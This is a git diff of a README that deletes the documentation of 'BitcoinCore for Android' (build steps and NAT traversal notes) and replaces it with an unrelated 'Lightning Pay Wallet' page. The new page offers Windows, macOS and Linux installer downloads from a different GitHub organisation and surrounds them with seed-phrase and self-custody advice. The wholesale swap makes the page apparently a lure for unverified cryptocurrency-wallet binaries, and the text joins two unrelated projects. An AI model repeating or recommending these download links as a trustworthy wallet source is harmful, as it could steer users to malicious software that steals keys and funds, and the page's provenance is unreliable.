@@ -1,83 +1,90 @@
-# BitcoinCore for Android
+<p align="center"><img src="assets/banner-profile.png" alt="Lightning Pay Wallet"></p>
 
-This app includes bitcoind and bitcoin-cli compiled for Android. All command line and config options are available to the user. There is an option to auto-start the daemon when device is charging and on WiFi.
+<h1 align="center">Lightning Pay Wallet</h1>
 
-Run it for fun, or to help me experiment with NAT traversal and other new capabilities. Please do not rely on this app to serve your wallet or you might lose all your funds.
+<p align="center">Your keys, your machine, and a backup you have actually tested.</p>
 
-Download on [PlayStore](https://play.google.com/store/apps/details?id=org.lndroid.bitcoincore), or build yourself. 
+<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-fed023?style=for-the-badge&labelColor=091640" alt="LICENSE"> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1"><img src="https://img.shields.io/badge/RELEASE-v1.2.1-fed023?style=for-the-badge&labelColor=091640" alt="RELEASE"></a></p>
 
-To download the debug.log file from the app, use:
+<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
 
-`adb backup -f backup.ab org.lndroid.bitcoincore; dd if=backup.ab bs=4K iflag=skip_bytes skip=24 | python -c "import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" > backup.tar`
+<div align="center">
 
-You will have to confirm a backup operation on your phone. After that, the contents of .bitcoin directory will be in the backup.tar.
+| Platform | Requirements | File |
+| --- | --- | --- |
+| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
+| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
+| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |
 
-## Building
+</div>
 
-First you need to build the bitcoin-core binaries for Android. Among common build dependencies you'll need Android Toolchain. Get an Android Studio and download the toolchain using SDK Manager.
+The three installers are release assets of the wallet repository; [the release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) lists them with the names in the table.
 
-First you need to build bitcoin dependencies:
-* Apply [this commit](https://github.com/autoconf-archive/autoconf-archive/pull/211/commits/0087595e99c8bb9a41f5c05a426b453c8d4d931c) to ./build-aux/m4/ax_boost_thread.m4.
-* Go to 'depends', read README. Choose you Android architecture (aarch64-linux-android and x86_64-linux-android are most common) and run something like:
+> **These files are published on the release page; a copy elsewhere is not ours.**
 
-`ANDROID_SDK=/home/user/Android/Sdk ANDROID_NDK=/home/user/Android/Sdk/ndk-bundle make HOST=aarch64-linux-android ANDROID_API_LEVEL=28 ANDROID_TOOLCHAIN_BIN=/home/user/Android/Sdk/ndk-
-bundle/toolchains/llvm/prebuilt/linux-x86_64/bin`
+---
 
-- When depends are built, configure bitcoin core to use them:
+## Self-custody is a skill, not a checkbox
 
-`./configure --host=aarch64-linux-android --disable-wallet --with-gui=no --prefix=/home/user/bitcoin/depends/aarch64-linux-android`
+A non-custodial wallet moves a specific risk from a company to you, and it does not remove that risk: it relocates it. The company can no longer freeze a balance, demand documents or lose the funds in a failure of its own. What replaces those risks is a phrase that has to be written down, stored offline and read back correctly, and a channel backup that has to travel with it if the balance sits in Lightning.
 
-- Then make. What you get is bitcoind and bitcoin-cli compiled for your chosen arch.
+That is why this page treats the backup as the main feature rather than a footnote. The wallet creates its keys on your device and keeps them there, which is the part everyone advertises. The part that decides whether you still hold the money in a year is whether the words exist on paper somewhere you can reach without the machine, and whether you have restored them once to prove they work.
 
-Now you can build this app with your compiled binaries:
-- Clone this repo and cd.
-- Create a directory for your chosen architecture. ARCH - one of names from [here](https://developer.android.com/ndk/guides/abis), most commonly arm64-v8a or x86_64.
+The rest of the wallet is built to keep that arrangement simple. Channels are managed for you, the on-chain balance sits beside the Lightning balance, and the application performs no identity check because there is no account behind it to check against.
 
-`mkdir app/src/main/jniLibs/$(ARCH)`
+## What a holder should know before installing
 
-- Copy your bitcoind and bitcoin-cli into the dir created above *under names libbitcoind.so and libbitcoin-cli.so*. This is the only way to force Android Studio to bundle the binaries with the APK.
-- Edit build.gradle's 'abiFilters' to only include the archs you compiled.
-- Build the project. The built apk should will now include your bitcoin core binaries.
+- **The phrase restores keys, not channels.** A restore without the channel backup brings back the on-chain balance and an empty channel list, which is a different outcome from losing money.
+- **A channel can close without you.** If your side stays offline long enough, the counterparty can force a close; the funds settle on-chain after a delay, provided the backup exists.
+- **The password is local.** Forgotten passwords are recoverable with the phrase, and forgotten phrases are not recoverable at all.
+- **A restore test is cheap.** Rehearsing the import on a second machine, before a balance is large, is the only way to know the backup works.
 
-## NAT traversal
+## Where to read next
 
-This app is built as a testing environment for NAT traversal capability that I'm working on. [Igor Cota](https://icota.github.com/) proposed the idea of 'sleeper nodes' on the LN [mailing list](https://lists.linuxfoundation.org/pipermail/lightning-dev/2020-May/002694.html). Essentially, we want the pruned nodes on mobile devices to be able to serve light clients (at night, when device is charging and has access to WiFi). For that we need NAT traversal built into the bitcoind.
+| Guide | What it answers |
+| --- | --- |
+| [self-custody: what you hold](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-self-custody.md) | What you hold, what you depend on, and what happens to both if the company stops. |
+| [seed phrase and wallet recovery](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-seed-phrase-and-wallet-recovery.md) | The phrase, the channel backup, the password and the four failures that account for most losses. |
+| [compared with other desktop wallets](https://github.com/bitcoin-lightning-wallet/invoice-channel-guides/blob/HEAD/lightning-pay-wallet-vs-desktop-lightning-wallets.md) | How the desktop options differ on custody, platform and recovery, including where this one is the wrong choice. |
 
-Here is brief overview of the problem:
+## What self-custody asks of you
 
-The main problem with NAT is that it only allows outgoing connections: external endpoint (IP+port) is assigned to an internal endpoint when it connects to public internet. Incoming connections are blocked bcs NAT doesn't know which internal endpoint is targeted by this incoming packet. Our case might be worse bcs if both peers that try to communicate are behind NAT, so no matter which party tries to connect - it won't work.
+It asks for a written phrase, stored offline, in an order you can read back correctly a year later. It asks for a channel backup kept beside it if any part of the balance sits in Lightning. It asks you to install the current release rather than the build that was current when you first read a guide. And it asks you to accept that a mistake in any of those three is yours, because there is no server, no reset and no support desk holding a copy of anything.
 
-The main solution for 'both peers behind NAT' is 'hole-punching', specifically [TCP hole punching](https://en.wikipedia.org/wiki/TCP_hole_punching) in our case. It is basically this:
-- Get a predictable external endpoint by taking advantage of [default NAT behaviours](https://tools.ietf.org/html/rfc5382)
-- Exchange external endpoints with a peer that you want to talk to
-- Do [simultaneous TCP open](http://ttcplinux.sourceforge.net/documents/one/tcpstate/tcpstate.html): simultaneously call 'connect' to each other, which results in 2 SYN packets sent, at least one of which will generally pass through and result in a connection.
+## The backup that is easy to forget
 
-The solution to 'only acceptor is NATed' is similar:
-- Acceptor gets a predictable external endpoint by taking advantage of default NAT behaviours
-- Connector exchanges it's external endpoint with acceptor
-- Acceptor connect to connector.
+Channel funds are not derivable from the seed. The phrase restores keys and the on-chain balance; the channel backup restores what was in a channel when it was last written. A holder who backs up only the words has backed up half a wallet, and the half that goes missing is the one that held the spending balance. The recovery guide treats the two objects as separate jobs for exactly that reason.
 
-In more details, and for bitcoin core in particular:
-- NAT-ed peer must have at least 1 outgoing connection kept-alive to some known public endpoint. When such connection is established, NAT will assign an external IP+port to our internal ip+port, and will assign the same external IP+port to all connections established from the same internal IP+port to any other external endpoint. In our case, our node just needs to connect to at least 1 full node with public IP, which it already does. Also, the first version+verack exchange results in our node discovering it's external endpoint assigned by NAT which it will use later.
-- All further connections will have to be made using THE SAME local port, bcs any other port would get a different external IP+port and that's not what we need. This means that bitcoin-core must do 'bind(fd, 8333)' on every outgoing connection before calling 'connect'. This way all connections our node has will have the same internal IP+port and same external IP+port.
-- Now, the external IP+port assigned to our node A starts propagating over the network, and let's say node B discovers it and wants to connect. Somehow, node A must be informed about B's intention so that both of them could do 'simultaneous TCP open'. This is THE PROBLEM, which others solve using [STUN](https://tools.ietf.org/html/rfc5389), and I will describe my ideas about it below. This is where B needs to know it's own external endpoint - to advertise it to A.
-- So, B want's to connect to A and A knows that (and both now know each other's external endpoints). Both call 'connect' approximately simultaneously, sending SYN packets to each other. For both peers, when such SYN reaches local NAT, it results in NAT registering that remote peer endpoint is now allowed to send packets to this external IP+port and his packets must be delivered to such and such private IP+port. And so both SYNs create an address mapping in their local NATs such that when remote SYN arrives, NAT lets it through and the connection is established. Both peers perform several connect attempts until some timeout, bcs the whole thing is rather fragile and non-deterministic. If only one party is NATed, then only NATed connects, and non-NATed accepts as usual.
+## When a different wallet is the better choice
 
-So, what needs to be done in bitcoin core is:
-- a -nat-traversal flag to enable this special mode (probably can be auto-enabled if node discovers he is behind NAT)
-- *bindconnect*: all 'connect' calls are now preceeded with 'bind' using the port we'd listen to (8333 by default)
-- *relay*: a new subsystem that allows a node to receive requests-for-connection from external peers (let's call it "RELAY")
-- *inboundconnect*: a new logic reacting to requests-for-connection from relay: create a socket, bind it and connect to requesting peer and then mark the peer as 'inbound' 
-- *outboundaccept*: a new logic where our node is not NATed and wants to connect to a NATed one: we send NATed node our request-for-connection using relay and then accept his connection and mark it as 'outbound' 
+If the machine is a phone, a desktop application is the wrong shape. If the balance is large and rarely spent, a hardware wallet is the better home for it, with a small Lightning balance beside it for payments. If the holder will not keep a phrase, a custodial app removes the failure mode they are most likely to hit. None of those is a criticism of this wallet; they are the cases where another tool fits the job better.
 
-Relay seems like the hardest problem, and essentially [STUN](https://tools.ietf.org/html/rfc5389) is the known solution. It's a known third-party server, to which all peers are connected (or rather 'send UDP packets once per minute'). When B wants to connect to A it sends a request to Relay, and Relay forwards the request to A, which passes through A's NAT bcs A is pinging the Relay and it's NAT keeps an address mapping.
+## Testing a restore before you need it
 
-Initially, we could just build a simple open-source Relay server. Problem is: every peer needs to connect to it, which makes it a single-point of failure and centralization. If volunteers ran many copies of it then all nodes would either have to connect to all Relays or use some sharding. And if we take the sharding logic far enough we end up with a DHT (which could be built into the bitcoin core): each peer could store a 'mailbox' for a subset of network peers, those peers would keep connections to it and others could send requests-for-connection through the mailboxes. We could also try to come up with a way for public nodes both peers are connected to to act as matchmakers, although I'm skeptical due to privacy and scalability issues.
+A backup nobody has restored is a claim rather than a fact. The cheap test is to install the wallet on a second machine, import the phrase there, and confirm the on-chain balance appears; the channel side is confirmed by restoring the backup file the wallet produces. Doing that while the balance is small turns a future emergency into a rehearsal, and it is the only way to discover a misread word before it matters.
 
-I have implemented [bindconnect](https://github.com/brugeman/bitcoin/tree/bindconnect) and [inboundconnect](https://github.com/brugeman/bitcoin/tree/inboundconnect), and working on outboundaccept now. Then I will experiment with relay options. All these will be tested using this app and it's userbase.
+## What a good backup looks like
 
-Join my coding efforts, or at least run the app :)
+Paper, in order, offline, and stored somewhere a house fire would not reach both it and the machine. A photo
+on a phone is not a backup: it is a copy inside the device that the backup is meant to survive.
+
+## How this page relates to the wallet
+
+This repository is a project page for the wallet: it carries the download and the reading order, and the application itself is maintained in the wallet repository.
+
+**Write the phrase before the first payment, keep it offline, and never type it into a page that asked for it first.**
+
+## Support
+
+Report a defect in the [wallet repository's issues](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/issues). No support channel needs a phrase or a private key.
 
 ## License
 
-MIT
+MIT.
+
+---
+
+<p align="center">
+<a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop">The wallet repository</a> -
+<a href="https://github.com/bitcoin-lightning-wallet/invoice-channel-guides">All guides</a>
+</p>
